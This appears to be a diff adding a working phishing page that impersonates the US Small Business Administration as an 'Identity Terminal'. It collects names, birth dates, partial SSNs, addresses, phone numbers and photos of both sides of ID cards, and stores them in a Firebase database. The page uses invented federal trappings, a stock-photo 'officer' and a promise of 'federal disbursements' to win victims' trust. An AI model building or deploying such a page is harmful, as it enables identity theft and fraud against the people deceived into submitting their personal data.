@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | Identity Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
+        :root { --sba-navy: #002e6d; --sba-red: #cc0000; }
+        
+        body { background: #f4f7f9; font-family: 'Public Sans', sans-serif; color: #0f172a; margin: 0; overflow-x: hidden; -webkit-font-smoothing: antialiased; }
+
+        /* Header Styles */
+        .header-container { background: white; padding: 12px 20px; display: flex; align-items: center; border-bottom: 2px solid #e2e8f0; position: sticky; top: 0; z-index: 1000; }
+        .sba-logo-sm { width: 32px; height: 32px; position: relative; display: flex; align-items: center; justify-content: center; flex-shrink: 0; cursor: pointer; }
+        .logo-text-sm { font-size: 11px; font-weight: 900; color: var(--sba-navy); z-index: 5; }
+        .brk-top { position: absolute; top: 0; right: 0; width: 70%; height: 40%; border-top: 2.5px solid var(--sba-navy); border-right: 2.5px solid var(--sba-navy); }
+        .brk-btm { position: absolute; bottom: 0; left: 0; width: 70%; height: 40%; border-bottom: 2.5px solid var(--sba-red); border-left: 2.5px solid var(--sba-red); }
+
+        /* Card & Input Styles */
+        .kyc-card { background: white; border-radius: 24px; padding: 20px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 10px 30px rgba(0,0,0,0.04); }
+        .label-text { font-size: 8px; font-weight: 900; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px; display: block; letter-spacing: 0.5px; margin-left: 2px; }
+        .input-field { 
+            width: 100%; height: 44px; background: #f8fafc; border: 1.5px solid #eef2f6; border-radius: 12px; 
+            padding: 0 12px; font-size: 13px; font-weight: 600; margin-bottom: 12px; outline: none; transition: 0.2s; 
+        }
+        .input-field:focus { border-color: var(--sba-navy); background: white; box-shadow: 0 0 0 4px rgba(0,46,109,0.05); }
+        
+        /* Buttons */
+        .btn-gov { 
+            width: 100%; height: 52px; background: var(--sba-navy); color: white; border-radius: 14px; 
+            font-weight: 900; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;
+            border-bottom: 4px solid #001a3d; transition: 0.2s; cursor: pointer;
+        }
+        .btn-gov:active { transform: translateY(2px); border-bottom-width: 1px; }
+
+        /* Support Card */
+        .support-row { display: flex; align-items: center; gap: 14px; padding: 12px; background: white; border: 1.5px solid #f1f5f9; border-radius: 20px; cursor: pointer; transition: 0.2s; }
+        .support-row:active { transform: scale(0.97); background: #f8fafc; }
+        .agent-avatar { width: 52px; height: 52px; border-radius: 14px; object-fit: cover; border: 2.5px solid #10b981; }
+        .status-dot { position: absolute; bottom: -2px; right: -2px; width: 12px; height: 12px; background: #10b981; border: 2px solid white; border-radius: 9999px; }
+
+        /* Status Displays */
+        .status-box { padding: 30px 10px; text-align: center; }
+        .status-icon-wrap { width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; }
+
+        /* Loading Overlays */
+        #loadingOverlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
+        #pageLoader { position: fixed; inset: 0; background: #f4f7f9; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    </style>
+</head>
+<body class="pb-24">
+
+    <div id="pageLoader">
+        <div class="w-10 h-10 border-4 border-slate-200 border-t-[#002e6d] rounded-full animate-spin"></div>
+        <p class="text-[8px] font-black text-slate-400 uppercase mt-4 tracking-[0.2em]">Authenticating Node...</p>
+    </div>
+
+    <div id="loadingOverlay">
+        <div class="w-12 h-12 border-4 border-slate-100 border-t-blue-700 rounded-full animate-spin mb-6"></div>
+        <p class="text-[10px] font-black text-slate-800 uppercase tracking-widest">Encrypting Biometrics...</p>
+        <div class="w-48 h-1 bg-slate-100 mt-5 rounded-full overflow-hidden">
+            <div id="loadBar" class="h-full bg-blue-700 w-0 transition-all duration-700"></div>
+        </div>
+    </div>
+
+    <header class="header-container">
+        <div class="sba-logo-sm" onclick="location.href='dashboard.html'"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
+        <div class="ml-3">
+            <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase tracking-tight">Identity Terminal</h1>
+            <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter mt-1">Section 202-A Compliance</p>
+        </div>
+        <a href="dashboard.html" class="ml-auto w-8 h-8 flex items-center justify-center bg-slate-100 rounded-full text-slate-500 text-xs">
+            <i class="fas fa-times"></i>
+        </a>
+    </header>
+
+    <main class="max-w-md mx-auto">
+        <div class="kyc-card">
+            
+            <div id="reason-box" class="hidden bg-rose-50 border-l-4 border-rose-600 p-3 rounded-lg mb-6">
+                <div class="flex gap-3">
+                    <i class="fas fa-circle-exclamation text-rose-600 mt-0.5 text-xs"></i>
+                    <div>
+                        <p class="text-[9px] font-black text-rose-700 uppercase tracking-wider">Verification Refused</p>
+                        <p id="decline-text" class="text-[10px] font-bold text-rose-800 mt-0.5 leading-snug"></p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="form-box" class="hidden">
+                <div class="flex items-center gap-2 mb-4">
+                    <div class="w-1.5 h-4 bg-red-600 rounded-full"></div>
+                    <h2 class="text-[11px] font-black text-slate-800 uppercase tracking-tight">Personal Credentials</h2>
+                </div>
+                
+                <label class="label-text">Full Legal Name</label>
+                <input type="text" id="fullName" class="input-field" placeholder="First Middle Last">
+
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="label-text">Date of Birth</label>
+                        <input type="date" id="dob" class="input-field">
+                    </div>
+                    <div>
+                        <label class="label-text">Gender</label>
+                        <select id="gender" class="input-field">
+                            <option value="Male">Male</option>
+                            <option value="Female">Female</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="label-text">SSN (Last 4)</label>
+                        <input type="tel" id="ssn" class="input-field" placeholder="0000" maxlength="4">
+                    </div>
+                    <div>
+                        <label class="label-text">Phone Number</label>
+                        <input type="tel" id="phone" class="input-field" placeholder="+1 (000) 000-0000">
+                    </div>
+                </div>
+
+                <div class="border-t border-slate-100 my-4 pt-4">
+                    <label class="label-text">Residential Address</label>
+                    <input type="text" id="address" class="input-field" placeholder="Street Address">
+                    <div class="grid grid-cols-3 gap-2">
+                        <input type="text" id="city" class="input-field" placeholder="City">
+                        <input type="text" id="state" class="input-field" placeholder="NY">
+                        <input type="tel" id="zip" class="input-field" placeholder="Zip">
+                    </div>
+                </div>
+
+                <div class="border-t border-slate-100 my-4 pt-4">
+                    <h2 class="text-[11px] font-black text-slate-800 uppercase tracking-tight mb-4">Identity Documents</h2>
+                    <div class="grid grid-cols-2 gap-3">
+                        <div class="h-28 border-2 border-dashed border-slate-100 rounded-2xl flex flex-col items-center justify-center bg-slate-50 relative overflow-hidden" onclick="document.getElementById('fIn').click()">
+                            <img id="fPrev" class="absolute inset-0 w-full h-full object-cover hidden z-10" alt="Front ID Preview">
+                            <i class="fas fa-camera text-slate-300 text-lg"></i>
+                            <span class="text-[8px] font-black text-slate-400 uppercase mt-2 tracking-widest">Front Side</span>
+                            <input type="file" id="fIn" hidden accept="image/*">
+                        </div>
+                        <div class="h-28 border-2 border-dashed border-slate-100 rounded-2xl flex flex-col items-center justify-center bg-slate-50 relative overflow-hidden" onclick="document.getElementById('bIn').click()">
+                            <img id="bPrev" class="absolute inset-0 w-full h-full object-cover hidden z-10" alt="Back ID Preview">
+                            <i class="fas fa-camera text-slate-300 text-lg"></i>
+                            <span class="text-[8px] font-black text-slate-400 uppercase mt-2 tracking-widest">Back Side</span>
+                            <input type="file" id="bIn" hidden accept="image/*">
+                        </div>
+                    </div>
+                </div>
+
+                <button id="submitBtn" class="btn-gov mt-2">Submit Credentials</button>
+            </div>
+
+            <div id="pending-box" class="hidden status-box">
+                <div class="status-icon-wrap bg-blue-50 text-blue-600">
+                    <i class="fas fa-fingerprint fa-pulse text-2xl"></i>
+                </div>
+                <h2 class="text-lg font-black text-slate-800 uppercase italic">Under Audit</h2>
+                <p class="text-[10px] font-bold text-slate-400 px-4 uppercase mt-4 leading-relaxed tracking-wide">
+                    Treasury node #402 is validating your biometrics. This typically takes 2-4 hours.
+                </p>
+                <p class="text-[8px] font-black text-blue-600 uppercase tracking-widest mt-6">Case ID: <span id="case-id" class="text-slate-800">---</span></p>
+            </div>
+
+            <div id="verified-box" class="hidden status-box">
+                <div class="status-icon-wrap bg-emerald-50 text-emerald-600">
+                    <i class="fas fa-shield-check text-2xl"></i>
+                </div>
+                <h2 class="text-lg font-black text-emerald-600 uppercase italic">Authorized</h2>
+                <p class="text-[10px] font-bold text-slate-500 px-4 uppercase mt-4 leading-relaxed">
+                    Identity confirmed. Your profile is now cleared for federal disbursements.
+                </p>
+                <a href="dashboard.html" class="inline-block mt-8 text-[10px] font-black uppercase bg-emerald-600 text-white px-10 py-3 rounded-xl shadow-lg shadow-emerald-100">
+                    Continue to Dashboard
+                </a>
+            </div>
+
+            <div class="mt-8 pt-6 border-t border-dashed border-slate-200">
+                <div class="support-row shadow-sm" onclick="location.href='support.html'">
+                    <div class="relative">
+                        <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=150" class="agent-avatar" alt="Officer Sarah Miller">
+                        <div class="status-dot"></div>
+                    </div>
+                    <div class="flex-1">
+                        <h3 class="text-[12px] font-black text-slate-800 uppercase tracking-tight">Officer Sarah Miller</h3>
+                        <p class="text-[9px] font-bold text-emerald-600 uppercase flex items-center gap-1.5 mt-0.5">
+                            ONLINE • CLICK TO CHAT WITH AGENT
+                        </p>
+                    </div>
+                    <div class="w-9 h-9 bg-slate-50 rounded-full flex items-center justify-center border border-slate-100 text-slate-400">
+                        <i class="fas fa-headset text-xs"></i>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <div class="fixed bottom-6 right-6 z-[999]">
+        <button onclick="location.href='support.html'" class="w-16 h-16 bg-[#002e6d] text-white rounded-full shadow-2xl flex items-center justify-center border-4 border-white active:scale-90 transition-all">
+            <i class="fas fa-headset text-2xl"></i>
+        </button>
+    </div>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { doc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        let frontData = "", backData = "";
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) { location.href = 'login.html'; return; }
+            document.getElementById('case-id').innerText = user.uid.substring(0,12).toUpperCase();
+
+            onSnapshot(doc(db, "users", user.uid), (snap) => {
+                const data = snap.data();
+                document.getElementById('pageLoader').style.display = 'none';
+                if(!data) return;
+
+                const f = document.getElementById('form-box'), p = document.getElementById('pending-box');
+                const v = document.getElementById('verified-box'), r = document.getElementById('reason-box');
+
+                f.classList.add('hidden'); p.classList.add('hidden'); v.classList.add('hidden'); r.classList.add('hidden');
+
+                const status = data.kycStatus || "IDLE";
+
+                if(["UNDER_REVIEW", "PENDING"].includes(status)) p.classList.remove('hidden');
+                else if(["VERIFIED", "SUCCESSFUL", "APPROVED"].includes(status)) v.classList.remove('hidden');
+                else if(["DECLINED", "REJECTED", "FAILED"].includes(status)) {
+                    f.classList.remove('hidden');
+                    if(data.kycNote || data.kycDenialReason) {
+                        r.classList.remove('hidden');
+                        document.getElementById('decline-text').innerText = data.kycNote || data.kycDenialReason;
+                    }
+                } else f.classList.remove('hidden');
+            });
+        });
+
+        // Image Compression & Preview
+        const processImage = (file, side) => {
+            if(!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const img = new Image();
+                img.src = e.target.result;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const scale = 500 / img.width;
+                    canvas.width = 500; canvas.height = img.height * scale;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    const compressed = canvas.toDataURL('image/jpeg', 0.6);
+                    if(side === 'f') frontData = compressed; else backData = compressed;
+                    const prev = document.getElementById(side + 'Prev');
+                    prev.src = compressed; prev.classList.remove('hidden');
+                };
+            };
+            reader.readAsDataURL(file);
+        };
+
+        document.getElementById('fIn').onchange = (e) => processImage(e.target.files[0], 'f');
+        document.getElementById('bIn').onchange = (e) => processImage(e.target.files[0], 'b');
+
+        // Form Submission
+        document.getElementById('submitBtn').onclick = async () => {
+            const btn = document.getElementById('submitBtn');
+            const fields = {
+                fullName: document.getElementById('fullName').value,
+                dob: document.getElementById('dob').value,
+                ssn: document.getElementById('ssn').value,
+                phone: document.getElementById('phone').value,
+                address: document.getElementById('address').value,
+                city: document.getElementById('city').value,
+                state: document.getElementById('state').value,
+                zip: document.getElementById('zip').value
+            };
+
+            if(!frontData || !fields.fullName || !fields.ssn) return alert("Please fill all required fields and upload ID documents.");
+
+            btn.disabled = true;
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            const loadBar = document.getElementById('loadBar');
+            loadBar.style.width = "40%";
+            
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    ...fields,
+                    idFront: frontData, idBack: backData,
+                    kycStatus: "UNDER_REVIEW",
+                    kycDate: new Date().toLocaleString(),
+                    kycNote: ""
+                });
+                loadBar.style.width = "100%";
+                setTimeout(() => { document.getElementById('loadingOverlay').style.display = 'none'; }, 800);
+            } catch (err) {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                btn.disabled = false;
+                alert("Submission failed. Check connection.");
+            }
+        };
+    </script>
+</body>
+</html>
